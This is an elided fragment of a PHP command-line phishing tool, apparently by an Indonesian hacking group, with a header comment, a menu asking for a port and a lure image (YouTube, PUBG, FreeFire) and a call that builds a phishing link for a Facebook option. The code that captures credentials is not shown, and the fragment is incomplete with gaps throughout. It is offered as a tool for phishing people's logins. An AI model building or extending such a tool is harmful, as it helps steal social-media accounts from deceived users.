...
/*
            ...
            My Team    : Next C yber Team
            Tools Name : Phisisng
            Version    : 1.0
            Website    : officialnct.zone.id  / nextcyberhack-tutorial.blogspot.com
            Pesan      : Jangan Direcode Ya :'V Buatnya Susah Njir
*/
...
[+]=========================================================================[+]
                    INFORMASI TOOLS                                  
Recoded By  : NextCyberHack (Newbie)
...
if ($pilih == '01' || $pilih == '1') {
	...
	if (is_numeric($port)) {
		echo "\n(1) Youtube (2) PUBG (3) FreeFire (0) Custom ? \n";
		echo "[+] Use Image => : ";
	...
	if ($opsi == 1) {
		// FB
		echo "\n\n[+] Your ID : " . $random . "\n[+] Membuat Link : Loading ...";
		buat_phising($opsi, $random, $url);
	}
}elseif($pilih == '00' || $pilih == '0'){
	exit();
}else{
	echo "\n\n[=] Kode Salah !!!\n\n";
	exit();
